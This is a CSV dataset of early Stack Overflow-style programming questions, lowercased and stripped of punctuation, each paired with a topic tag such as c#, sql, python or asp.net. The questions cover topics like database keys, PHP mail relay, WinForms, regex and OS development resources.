Id,Title,Tag
38510,c winforms  datagridviewsql compact  negative integer in primary key column im just getting dirty in winforms and ive discovered through a lovely tutorial the magic of dragging a database table onto the design view of my main form so all is lovely ive got my datagridview with all of the columns represented beautifullybutwhen i run my application against this brand new empty sdf empty save for the two tables ive created which are themselves empty i get a 1 in the column corresponding to my primary keyidentity column whenever i try to create that first recordany idea why this might be happening if it helps the column is an int,c#
38670,aspnet controls cannot be referenced in codebehind in visual studio 2008 ok so my visual studio is broken i say this not prematurely as it was my first response to see where i had messed up in my code when i add controls to the page i cant reference all of them in the code behind some of them i can it seems that the first few i put on a page work then it just stops i first thought it may be the type of control as initially i was trying to reference a repeater inside an update panel i know i am correctly referencing the code behind in my aspx page but just in case it was a  screw up on my part i started to recreate the page from scratch and this time got a few more controls down before vs stopped recognizing my controlsafter creating my page twice and getting stuck i thought maybe it was still the type of controls i created a new page and just threw some labels on it no dice build fails when referencing the control from the code behind in a possibly unrelated note when i switch to the dreaded design mode of the aspx pages vs 2008 errors out and restarts i have already put a trouble ticket in to microsoft i uninstalled all addins i reinstalled visual studio anyone that wants to see my code just ask but i am using the straight wysiwyg visual studio new aspx page nothing fancyi doubt anyone has run into this but have you has anyone had success trouble shooting these things with microsoft any way to expedite this ticket without paying i have been talking to a rep from microsoft for days with no luck yet and i am dead in the water thank you jon limjap i edited the title to both make it clear and descriptive and make sure that nobody sees it as offensive foobarred doesnt exactly constitute a proper question title although your question is clearly a valid one,c#
38680,how to provide next page of updated content feel free to edit the title if you know how to formulate the question better tagging is a problem as well the problem may be too difficult in this general form so let us consider a concrete exampleyou get a screenful of stackoverflow questions by requesting questions sortnewest page next page link leads to questionspage2 ampsortnewest i suppose that at server side the request is translated into an sql query with limit clause problem with this approach is that if new question were added while user browses first page his second page will start with some questions he already saw if he has 10 question per page and 10 new questions happened to be added hell get exactly the same content second timeis there an elegant way to solve this common problem i realize that it is not that big a problem at least not for stackoverflow but stillthe best idea i have apart from storing request history per client is to use questionsansweridnnn format server returns a page that starts with the requested answer and puts the id of the first answer on the next page into next page link there must be a way to write sql for that right is it how it usually done or there is a better way,sql
38820,which class design is better which class design is better and whypublic class user    public string username    public string password    public string firstname    public string lastnamepublic class employee  user    public string employeeid    public string employeecode    public string departmentidpublic class member  user    public string memberid    public string joindate    public string expirydateorpublic class user    public string userid    public string username    public string password    public string firstname    public string lastnamepublic class employee    public user userinfo    public string employeeid    public string employeecode    public string departmentidpublic class member    public user userinfo    public string memberid    public string joindate    public string expirydate,oop
38870,one or two primary keys in manytomany table i have the following tables in my database that have a manytomany relationship which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tableswidget widgetid pk title price  user userid pk firstname lastnameassume that each userwidget combination is unique i can see two options for how to structure the connecting table that defines the data relationshipuserwidgets1 userwidgetid pk widgetid fk userid fk  userwidgets2 widgetid pk fk userid pk fkoption 1 has a single column for the primary key however this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables and this relationship itself can form a unique key thus leading to option 2 which has a twocolumn primary key but loses the onecolumn unique identifier that option 1 has i could also optionally add a twocolumn unique index widgetid userid to the first tableis there any real difference between the two performancewise or any reason to prefer one approach over the other for structuring the userwidgets manytomany table,database
38890,enforce constraint checking only when inserting rows in mssql is there a way to enforce constraint checking in mssql only when inserting new rows  ie allow the constraints to be violated when removingupdating rowsupdate i mean fk constraint,sql-server
38920,php mail not working windows 2003 iis smtp im getting this problemphp warning mail functionmail smtp server response 550 571 unable to relay for chrismahangmailcom in cinetpubwwwrootmailtestphp on line 12 from this scriptltphpto  chrismahangmailcomsubject  testbody  this is a testif mailto subject body    echo mail sentelse     echo problemgtsection from phpini on the servermail function for win32 onlysmtp  serverdomaincom for win32 onlysmtpport  25 for win32 onlysendmailfrom  supportdomaincom for unix only  you may supply arguments as well default sendmail t isendmailpath note that server and domain refer accurately to the actual server and domain namein iis smtp is running under access tab relay button the select which computers may relay through this virtual server is set to checkbox only the list below and on the list is 127001xxxxxxxxxxxx xs representing actual server ip addressserver is running windows server 2003 service pack 2 fully patched as of 5 pm sept 1st 2008 i assume it is running iis7 how to checkany ideasin reponse to espo this machine is hosted at a datacenter we do not want to use a gmail account were doing it want to move away from that windows server 2003 comes with its own smtp serverupdate per yaakov ellis advice i dropped all relay restrictions and added the server  ip to the allowed list using the reverse dns button provided and the thing started workingthanks to both espo and yaakov for helping me out,php
38940,generate field in mysql select if ive got a table containing field1 and field2 can i generate a new field in the select statement for example a normal query would beselect field1 field2 from tableand i want to also create field3 and have that returned in the resultset something along the lines of this would be idealselect field1 field2 field3  value from tableis this possible at all,sql
38960,how to find out if a file exists in c  net i would like to test a string containing a path to a file for existence of that file something like the e test in perl or the ospathexists in python in c,c#
39070,programmable secure ftp replacement we need to move off traditional ftp for security purposes it transmits its passwords unencrypted i am hearing ssh touted as the obvious alternative however i have been driving ftp from an aspnet program interface to automate my website development which is now quite a highly webenabled process can anyone recommend a secure way to transfer files around which has a program interface that i can drive from aspnet,asp.net
39240,similar posts like functionality using ms sql server i have lots of article store in ms sql server 2005 database in a table called articlesarticles articleid articletitle articlecontentnow i want some sp or sql query which could return me similar article against any users input very much like similar posts in blogs or related questions in stackoverflow the matching should work on both articletitle and articlecontent the query should be intelligent enough to sort the result on the basis on their relevancyis it possible to do this in ms sql server 2005,sql
39770,what do you call the tags in subversion and cvs that add automatic content things like log and version which add data upon checkin to the file im interested in seeing the other ones and what information they can provide but i cant get much info unless i know what they are called,svn
39780,how do i check job status from ssis control flow heres my scenario  i have an ssis job that depends on another prior ssis job to run i need to be able to check the first jobs status before i kick off the second one its not feasible to add the 2nd job into the workflow of the first one as it is already way too complex i want to be able to check the first jobs status failed successful currently executing from the second ones and use this as a condition to decide whether the second one should run or wait for a retry i know this can be done by querying the msdb database on the sql server running the job im wondering of there is an easier way such as possibly using the wmi data reader task anyone had this experience,sql-server
39910,how to use the sharepoint multiplelookupfield control i want to use the  multiplelookupfield control in a web page that will run in the context of sharepoint i was wondering if anyone would help me with an example which shows step by step how to use the control two display two spfield collections,sharepoint
39960,javascript locals in python one can get a dictionary of all local and global variables in the current scope with the builtin functions locals and globals  is there some equivalent way of doing this in javascript  for instance i would like to do something like the followingvar foo  function alertfoo var bar  function alertbar var s  foolocalss  alerts foois this at all possible or should i just be using a local object for the lookup,javascript
40090,is overloading the only way to have default function arguments in c is it true that the only way to handle default function arguments is through function overloadingfor example in php i can do thisfunction foox y0would the best way to handle it in c be thisvoid fooint x  foox 0void fooint x int yexample lifted from hereeditmade the c example into actual c thanks blair conrad,c#
40230,guids as primary keys  offline oltp we are working on designing an application that is typically oltp think purchasing system however this one in particular has the need that some users will be offline so they need to be able to download the db to their machine work on it and then sync back once theyre on the lani would like to note that i know this has been done before i just dont have experience with this particular modelone idea i thought about was using guids as table keys so for example a purchase order would not have a number autonumeric but a guid instead so that every offline client can generate those and i dont have clashes when i connect back to the dbis this a bad idea for some reasonwill access to these tables through the guid key be slowhave you had experience with these type of systems how have you solved this problemthanksdaniel,sql-server
40480,is java passbyreference or passbyvalue i always thought java was passbyreference however ive seen a couple of blog posts for example this blog that claim its not i dont think i understand the distinction theyre making what is the explanation,java
40590,jquery and prototype selector madness both the jquery and prototpye javascript libraries refuse to allow me to use a variable to select an list item element by index number although they accept a hard coded number for example in prototype this worksli5addclassnameactivebut this will not work no matter how i try to cast the variable as a number or integerlicurrentpageaddclassnameactivein jquery i get similar weirdness this will workjquerylieq5addclassactivebut this will not work again even though the value of currentpage is 5 and its type is numberjquerylieqcurrentpageaddclassactiveim trying to create a javascript pagination system and i need to set the class on the active page button the list item elements are created dynamically depending upon the number of pages i need,jquery
40680,how do i get the full url of the page i am on in c i need to be able to get at the full url of the page i am on from a user control  is it just a matter of concatenating a bunch of request variables together  if so which ones or is there a more simpiler way,c#
40730,how do you give a c autoproperty a default value how do you give a c autoproperty a default value  i either use the constructor or revert to the old syntax  using the constructorclass person     public person            name  default name        public string name  get set using normal property syntax  with a default valueprivate string name  default namepublic string name     get             return name        set            name  value    is there a better way,c#
40840,cannot create an environment variable in the registry i have a custom installer action that updates the path environment and creates an additional environment variable appending a directory to the existing path variable is working fine but for some reason my attempts to create a new environment variable have been unsuccessful the code i am using is        using registrykey reg  registrylocalmachineopensubkeysystemcurrentcontrolsetcontrolsession managerenvironment true                    regsetvaluemyvar someval registryvaluekindexpandstring        edit the os is 32bit xp and as far as i can tell it is failing silently,c#
41010,smarty integration into the code igniter framework a little background informationive been looking at a few php framework recently and it came down to two the zend framework or codeigniter i prefer codeigniter because of its simple design its very bare bone and it is just kept simple the thing i dont like though is the weak template system the template system is important for me because i will be working with another designer being able to give him a good template system is a big pluszend was the second choice because of the better template system that is built in zend is a different beast though compared to codeigniter it emphasis loose coupling between modules but is a bigger framework i dont like to feel like i have many things running under the hood that i never use that is unnecessary overhead in my opinion so i thought about putting a template system into codeigniter smartyquestions how easyhard is the process to integrate smarty into codeigniter from my initial scan of the codeigniter documentation i can see that the layout of the framework is easy enough to understand and i anticipate no problems i want to know if anyone has used it before and therefore are aware of any gotchas you my have experienced that is going to make this harder than it should be or impossible to pull off i also want to know if this is a good thing to do at all is the template system in codeigniter enough for normal use are there any other template modules that are good for codeigniter aside from smarty i better off with zend framework is any wheel being invented here thank you for your help ,codeigniter
41050,where do you store your database connectionstring i usually store my connectionstring in webconfig or in the application settings of my visual studio project the application im currently working on makes a lot of trips to the database which means it will look up the connectionstring every time should i be putting the connectionstring in the cache or should i be looking at storing the whole sqlconnection object in the cache to eliminate the need to open and close them all the timeupdate seems like the consensus is to store the connection string in a configuration file and leave the caching in the trusting hand of adonet,asp.net
41220,is there a best net algorithm for credit card encryption the net systemsecuritycryptography namespace has a rather bewildering collection of algorithms that i could use for encryption of credit card details which is the bestit clearly needs to be secure for a relatively short string edit im in the uk where i understand were ok storing encrypted credit card details so long as the threedigit cvv number is never stored and thanks all for the great responses,.net
41290,file access strategy in a multithreaded environment web app i have a file which is an xml representation of some data that is taken from a web service and cached locally within a web application the idea being is that this data is very static but just might change so i have set it up to cache to a file and stuck a monitor against it to check if it has been deleted once deleted the file will be refreshed from its source and rebuilti am now running in to problems though because obviously in a multithreaded environment it falls over as it is trying to access the data when it is still readingwriting the filethis is confusing me because i added a object to lock against and this is always locked during readwrite it was my understanding that attempted access from other threads would be told to wait until the lock was releasedjust to let you know i am real new to multithreaded development so i am totally willing to accept this is a screw up on my part am i missing somethingwhat is the best file access strategy in a multithreaded environmenteditsorry  i should have said this is using aspnet 20 ,asp.net
41300,emacs in windows how do you run emacs in windowswhat is the best flavor of emacs to use in windows and where can i download it and where is the emacs file located,windows
41320,working on a visual studio project with multiple users i just wonder what the best approach is to have multiple users work on a project in visual studio 2005 professionalwe got a solution with multiple class libraries but when everyone opens the solution we keep getting the x was modified reloaddiscard prompt all the time just opening one project is an obvious alternative but i find it harder to use as you cant just see some of the other classes in other projects that wayare there any guidelines for team development with vs2005 proedit thanks the current environment is a bit limited in the sense there is only 1 pc with rdp connection but that will change in the future marking the first answer as accepted but they are all good ,visual-studio
41330,how to detect the presence of a default recording device in the system how do i detect if the system has a default recording device installedi bet this can be done through some calls to the win32 api anyone has any experience with thisim talking about doing this through code not by opening the control panel and taking a look under sound options,winapi
41400,how to wrap a function with variable length arguments i am looking to do this in cci came across variable length arguments but this suggests a solution with python amp c using libffinow if i want to wrap printf function with myprintfwhat i do is like belowvoid myprintfchar fmt     valist args    vastartargsfmt    printffmtargs    vaendargsint tmainint argc tchar argv    int a  9    int b  10    char v  c    myprintfthis is a number d and nthis is a character c and n another number dna v b    return 0but the results are not as expectedthis is a number 1244780 andthis is a character h andanother number 29953463any point where did i miss,c++
41460,what are the differences between gpl v2 and gpl v3 licenses in simple terms what are the reasons for and what are the differences between the gpl v2 and gpl v3 open source licenses explanations and references to legal terms and further descriptions would be appreciated,licensing
41580,should i keep registering a failure im working on an automated regression test suite for an app which i maintain  while developing the automated regression test i ran across some behavior thats almost certainly a bug  so for now ive modified the automated regression test to not register a failureits deliberately allowing this bad behavior to go by i mean  so i am interested in the opinions of others on this site  obviously ill add a bug to our defect tracking to make sure this error behavior gets fixed  but are there any compelling reasons either way to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior  i think of this as a 6 of one and a halfdozen of the other type of question but i ask here because i thought others may see it differentlypaul tomblinjust to be clearive never considered removing the test i was simply considering modifying the passfail condition to allow for the failure without it being thrown up in my face every time i run the test im a little concerned about repeated failures from known causes eventually getting treated like warnings in c  i know developers who see warnings in their c code and simply ignore them because they think theyre just useless noise  im afraid leaving a known failure in the regression suite might cause people to start ignoring other possibly more important failures btw lest i be misunderstood i consider warnings in c to be an important aid in crafting strong code but judging from other c developers ive met i think im in the minority,testing
41590,how do you properly use namespaces in c i come from a java background where packages are used not namespaces im used to putting classes that work together to form a complete object into packages and then reusing them later from that package but now im working in chow do you use namespaces in c do you create a single namespace for the entire application or do you create namespaces for the major components if so how do you create objects from classes in other namespaces,c++
41630,is it possible to concat arguments to a command line using backquotes  i would like to execute an os command from my ruby script but i want to add an argument from a ruby variablei know thats possible by using keyword system like that usrbinenv rubydirectory  homepaulgregsystem ls   directorybut is that possible by using the backquotes or backticks syntax i mean by using that syntax  ls,ruby
41640,mute specific application in vista i am in need of a way to mute a specific application in vistaexample mute just firefox but not all of the other application  much similar to muting a specific program from within the volume mixer in vista if there is a program that will do this i would appreciate that  otherwise if there is a way to do this i will write a small apppreferrably something netedit i want to automate this procedure possibly keymap it,windows-vista
41970,lightweight fuzzy search library can you suggest some light weight fuzzy text search librarywhat i want to do is to allow users to find correct data for search terms with typosi could use fulltext search engines like lucene but i think its an overkilleditto make question more clear here is a main scenario for that libraryi have a large list of strings  i want to be able to search in this list something like msvs intellisense but it should be possible to filter this list by string which is not present in it but close enough to some string which is in the listexample  redgreenbluewhen i type gren or geen in a text box i want to see green in the result setmain language for indexed data will be englishi think that lucene is to heavy for that taskupdatei found one product matching my requirements its shuffletextdo you know any alternatives,fuzzy-search
42070,why does the bourne shell printf iterate over a s argument whats going on hereprintfsh binshnamegeorge w bushprintf hello sn namecommand line session printfshhello georgehello whello bushupdate printf hello sn name works for why im not using echo considerechosh binshfilectmpecho filename filecommandline echoshfilename c    mpthe posix spec for echo says new applications are encouraged to use printf instead of echo for this and other reasons ,unix
42150,how can i unit test a windows service net framework 20preferred language ci am new to tdd test driven developmentfirst of all is it even possible to unit test windows servicewindows service class is derived from servicebase which has overridable methods onstart onstophow can i trigger those methods to be called as if unit test is an actual service that calls those methods in proper orderat this point am i even doing a unit testing or an integration testi have looked at wcf service question but it didnt make any sense to me since i have never dealt with wcf service,c#
42200,managing linq to sql dbml model complexity this question is addressed to a degree in this question on linq to sql dbml best practices but i am not sure how to add to a questionone of our applications uses linq to sql and we have currently have one dbml file for the entire database which is becoming difficult to manage  we are looking at refactoring it a bit into separate files that are more modulefunctionality specific but one problem is that many of the high level classes would have to be duplicated in several dbml files as the associations cant be used across dbml files as far as i know with the additional partial class code as wellhas anyone grappled with this problem and what recommendations would you make,linq
42460,custom titlebarschrome in a winforms app im almost certain i know the answer to this question but im hoping theres something ive overlookedcertain applications seem to have the vista aero look and feel to their caption bars and buttons even when running on windows xp google chrome and  windows live photo gallery come to mind as examples  i know that one way to accomplish this from winforms would be to create a borderless form and draw the caption barbuttons yourself then overriding wndproc to make sure moving resizing and button clicks do what theyre supposed to do im not clear on the specifics but could probably pull it off given a day to read documentation  im curious if theres a different easier way that im overlooking  perhaps some api calls or window styles ive overlookedi believe google has answered it for me by using the rollyourownwindow approach with chrome  i will leave the question open for another day in case someone has new information but i believe i have answered the question myself,.net
42490,tfs  branching for experimental development solution fails to load disclaimer im stuck on tfs and i hate itmy source control structure looks like thisdevreleasesbranchesexperimentalupgradei branched from dev to experimentalupgrade and didnt touch it  i then did some more work in dev and merged to experimentalupgrade  somehow tfs complained that i had changes in both source and target and i had to resolve them  i chose to copy item from source branch for all 5 itemsi check out the experimentalupgrade to a local folder and try to open the main solution file in there  tfs prompts me   projects have recently been added to this solution  would you like to get them from source controlif i say yes it does some stuff but ultimately comes back failing to load a handful of the projects  if i say no i get the same resultcomparing my sln in both branches tells me that they are equalcan anyone let me know what im doing wrong  this should be a straightforward branchmerge operationtiaupdatei noticed that if i click yes on the above dialog the projects are downloaded to the  root of source control ie out of the dev amp branches foldersif i open up the solution in the branch and remove the dead projects and try to readd them by rightclicking sln add existing project choose project located in the branch folder it gives me the error  cannot load the project csandboxmysolutionproj1proj1csproj the file has been removed or deleted  the project path i was trying to add is this  csandboxmysolutionbranchesexperimentalupgradeproj1proj1csprojwhat in the world is pointing these projects outside of their local root  the solution file is identical to the one in the dev branch and those projects load just fine  i also looked at the vspscc and vssscc files but didnt find anythingideas,version-control
42550,extract address information from a web page i need to take a web page and extract the address information from the page some are easier than others im looking for a firefox plugin windows app or vbnet code that will help me get this doneideally i would like to have a web page on our admin aspnetvbnet where you enter a url and it scraps the page and returns a dataset that i can put in a grid,vb.net
42610,metalanaguage to describe the model from mvc to generate identical client and server side code i am looking for a powerful metalanguage to describa behaviour for an application i intend to use in offline mode googlegears  javascript and server side sqlite  phprubyjava etc and looking for a good format to describe the models behaviour which can be easily converted to the target languagesam i completely off track and there is a much better way,javascript
42620,sql server views blessing or curse i once worked with an architect who banned the use of sql views his main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which if that coder tried harder could be avoided altogether  implicitly he was encouraging code reuse via copyandpaste instead of encapsulation in viewsthe database had nearly 600 tables and was highly normalised so most of the useful sql was necessarily verboseseveral years later i can see at least one bad outcome from the ban  we have many hundreds of dense lengthy stored procs that verge on unmaintainablein hindsight i would say it was a bad decision but what are your experiences with sql views  have you found them bad for performance any other thoughts on when they are or are not appropriate,sql
42690,which dynamic net language makes more sense to learn iron ruby or iron python id like to take some time to learn more about dynamic languages built on top of the dlr and im not sure which language would be better to learnhaving limited time i really only have time to look learn one of themany opinions on which of the two iron ruby or iron python would be more useful in the long run,.net
42710,efficient synthesis of a 4to1 function in verilog i need to implement a 4to1 function in veriog  the input is 4 bits a number from 015  the output is a single bit 0 or 1  each input gives a different output and the mapping from inputs to outputs is known but the inputs and outputs themselves are not  i want vcs to successfully optimizing the code and also have it be as shortneat as possible  my solution so farwire 30 awire bwire 150 cassign c  16b0100110010111010 for example but could be any constantassign b  cahaving to declare c is ugly and i dont know if vcs will recognize the kmap there  will this work as well as a case statement or an assignment in conjunctive normal form,logic
42740,what is wcf in simple terms what is wcf in simple termsits hard to distill the meaning from the wikipedia page,.net
42770,writingusing c libraries i am looking for basic examplestutorials onhow to writecompile libraries in c so files for linux dll files for windowshow to import and use those libraries in other code,c++
42830,setting focus with aspnet ajax control toolkit im using the autocomplete control from the aspnet ajax control toolkit and im experiencing an issue where the autocomplete does not populate when i set the focus to the assigned textbox  ive tried setting the focus in the pageload pageprerender and pageinit events and the focus is set properly but the autocomplete does not work  if i dont set the focus everything works fine but id like to set it so the users dont have that extra click  is there a special place i need to set the focus or something else i need to do to make this work  thanks,asp.net
42950,get last day of the month in python is there a way using pythons standard library to easily determine ie one function call the last day of a given monthif the standard library doesnt support that does the dateutil package support this,python
42980,how to use p4merge as the mergediff tool for mercurial does anyone know how to setup mercurial to use p4merge as the mergediff tool on os x 105,osx
42990,regex to match against something that is not a specific substring i am looking for a regex that will match a string that starts with one substring and does not end with a certain substringexample updated to be correct thanks apocalispfooltbarshould match anything that starts with foo and doesnt end with bar  i know about the  syntax but i cant find anything that will do that for a string instead of single characters  i am specifically trying to do this for javas regex but ive run into this before so answers for other regex engines would be great too  thanks to kibbee for verifying that this works in c as well  ,c#
43180,what are some resources for getting started in operating system development one thing ive always wanted to do is develop my very own operating system not necessarily fancy like linux or windows but better than a simple boot loader which ive already doneim having a hard time finding resourcesguides that take you past writing a simple hello world os  i know lots of people will probably recommend i look at linux or bsd but the code base for systems like that is presumably so big that i wouldnt know where to startany suggestionsupdate to make it easier for people who land on this post through google here are some os development resourceswriting your own operating system thanks adamlinux from scratch thanks johnsharpos c operating system thanks lomaxxminix3 and minix2 thanks mikeos dev wiki and forums thanks stevebonafide thanks stevebran thanks steveroll your own toy unixclone os thanks stevebroken thorn os development seriesother resourcesi found a nice resource named mikeos mikeos is a learning tool to demonstrate how simple oses work it uses 16bit real mode for bios access so that it doesnt need complex driversupdated 111408 i found some resources at freebytes guide tofree and nonfree operating systems that links to kits such as oskit and exos library  these seem super useful in getting started in os developmentupdated 22309ric tokyo recommended nanoos in this question  nanoos is an os written in cupdated 3909dinah provided some useful stack overflow discussion of aspiring os developers roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an osand os development is a more general discussionupdated 7909lb provided a link to the pintos project an education os designed for students learning os developmentupdated 72709 still going strongi stumbled upon an online os course from berkley featuring 23 lecturestomos is a fork of mikeos that includes a little memory manager and mouse support as mikeos it is designed to be an educational project  it is written in nasm assemblerupdated 8409i found the slides and other materials to go along with the online berkeley lectures listed above updated 82309all questions tagged osdev on stackoverflowos161 is an academic os written in c that runs on a simulated hardware  this os is similar in nachos  thanks novelocrattangurena recommends httpenwikipediaorgwikimicrocosii an os designed for embedded systems  there is a companion book as welllinux kernel development by robert love is suggested by anders  it is a widely acclaimed insiders look at the linux kernelupdated 9182009thanks tim s van haren for telling us about cosmos an os written entirely in ctgiphil tells us about managed operating system alliance mosa framework a set of tools specifications and source code to foster development of managed operating systems based on the common intermediate languageupdate 9242009steve found a couple resources for development on windows using visual studio check out brokenthorns guide setup with vs 2005 or osdevs vs sectionupdate 1202012a set of tutorials aims to take you through programming a simple unixclone operating system for the x86 architecturejamesms kernel development tutorialsupdated 952012kerneltraporg is no longer available  the linux kernel v001 is available from kernelorgupdated 12212012a basic os development tutorial designed to be a semesters project it guides you through to build an os with basic components very good start for beginners related paper  thanks srujanupdated 11152013writing a simple operating system from scratch  thanks james mooreupdated 1282013how to make a computer operating system  thanks ddtoniupdated 3182014toaruos an os built mostly from scratch including guiupdated sept 12 2016writing your own toy operating system,operating-system
43290,how to generate urls in django in djangos template language you can use  url viewname args  to generate a url to a specific view with parameters how can you programatically do the same in python codewhat i need is to create a list of menu items where each item has name url and an active flag  whether its the current page or not this is because it will be a lot cleaner to do this in python than the template language,python
43320,nhibernate isession flush where and when to use it and why one of the things that get me thoroughly confused is the use of sessionflushin conjunction with sessioncommit and sessionclosesometimes sessionclose works eg it commits all the changes that i need i know i need to use commit when i have a transaction or a unit of work with several createsupdatesdeletes so that i can choose to rollback if an error occursbut sometimes i really get stymied by the logic behind sessionflush i have seen examples where you have a sessionsaveorupdate followed by a flush but when i remove flush it works fine anyway sometimes i run into errors on the flush statement saying that the session timed out and removing it made sure that i didnt run into that errordoes anyone have a good guideline as to where or when to use a flush ive checked out the nhibernate documentation for this but i still cant find a straightforward answer,.net
43400,is there a standard html layout with multiple css styles available when it comes to webdesign i am horrible at producing anything remotely good looking thankfully there are a lot of free sources for design templates however a problem with these designs is that they just cover a single page and not many use cases if you take a look at css zen gardens they have 1 single html file and can radically style it differently by just changing the css filenow i am wondering if there is a standard html layout tags and ids that covers alot of use cases and can be generically themed with different css files like zen garden what i am imagining is a set of rules off how you write your html and what boxes lists menus and styles you are supposed to use a set of standard test pages covering the various uses can be created and a new css file while have to support all the different pages in a nice viewis there any projects that covers anything similar to what i am describing,html
43490,when is controldestroyhandle called when is this called more specifically i have a control im creating  how can i release handles when the window is closed in normal win32 id do it during wmclose  is destroyhandle the net equivalenti dont want to destroy the window handle myself  my control is listening for events on another object and when my control is destroyed i want to stop listening to those events egvoid disposebool disposing     otherobjectevent  myeventhandler,.net
43500,is there a builtin method to compare collections in c i would like to compare the contents of a couple of collections in my equals method  i have a dictionary and an ilist  is there a builtin method to do thiseditedi want to compare two dictionaries and two ilists so i think what equality means is clear  if the two dictionaries contain the same keys mapped to the same values then theyre equal,c#
43580,how to find the mime type of a file in python lets say you want to save a bunch of files somewhere for instance in blobs lets say you want to dish these files out via a web page and have the client automatically open the correct applicationviewerassumption the browser figures out which applicationviewer to use by the mimetype contenttype header in the http responsebased on that assumption in addition to the bytes of the file you also want to save the mime typehow would you find the mime type of a file im currently on a mac but this should also work on windows does the browser add this information when posting the file to the web pageis there a neat python library for finding this information a webservice or even better a downloadable database,python
43870,how to concatenate strings of a string field in a postgresql group by query i am looking for a way to concatenate the strings of a field within a group by query so for example i have a tableid   companyid   employee1    1            anna2    1            bill3    2            carol4    2            daveand i wanted to group by companyid to get something likecompanyid   employee1            anna bill2            carol davethere is a builtin function in mysql to do this groupconcat,sql
43890,crop mp3 to first 30 seconds original questioni want to be able to generate a new fully valid mp3 file from an existing mp3 file to be used as a preview  trybeforeyoubuy style the new file should only contain the first n seconds of the tracknow i know i could just chop the stream at n seconds calculating from the bitrate and header size when delivering the file but this is a bit dirty and a real pita on a vbr track id like to be able to generate a proper mp3 fileanyone any ideasanswersboth mp3split and ffmpeg are both good solutions i chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows  heres some more good command line parameters for generating previews with ffmpegt ltsecondsgt chop after specified number of secondsy force file overwriteab ltbitrategt set bitrate eg ab 96kar ltrate hzgt set sampling rate eg ar 22050 for 2205khzmapmetadata ltoutfilegtltinfilegt copy track metadata from infile to outfileinstead of setting ab and ar you can copy the original track settings as tim farley suggests withacodec copy,mp3
43920,what software to use for a multistage development environment for me a multistage environment contains environments for development testing quality assurance maybe a client review stage and finally production it should allow easy collaboration between developers project status tracking and easy deployment of the application to any stage for a specific version you can propose specific tools for specific application types but i think the question is general enough is there any software package ready to use out of the box,version-control
43940,custom aggregate functions in ms sql server how can i create a custom aggregate function in ms sql server an example would help a lot,sql-server
43960,cots workshop registration system does anyone have any experience with any cots systems for managing workshops and the associated registrations courses communications etcwe have a homebuilt perl system that is about 8 years old and is currently embedded as an iframe in a sharepoint portal site externally facing needless to say it isnt integrated into our site well looks like crap needs an overhaul lacks features etc it would be nice to find either a product we can install or a service that provides those featuresthanks,cots
43970,configuring sendmail behind a firewall im setting up a server which is on a network behind a firewall and i want programs on this computer to be able to use sendmail to send emails to any email address  we have an smtp server running on this network lets call it mailrelayexamplecom which is how were supposed to get outgoing emails through the firewallso how do i configure sendmail to send all mail through mailrelayexamplecom  googling hasnt given me the answer yet and has only revealed that sendmail configuration is extremely complex and annoying,configuration
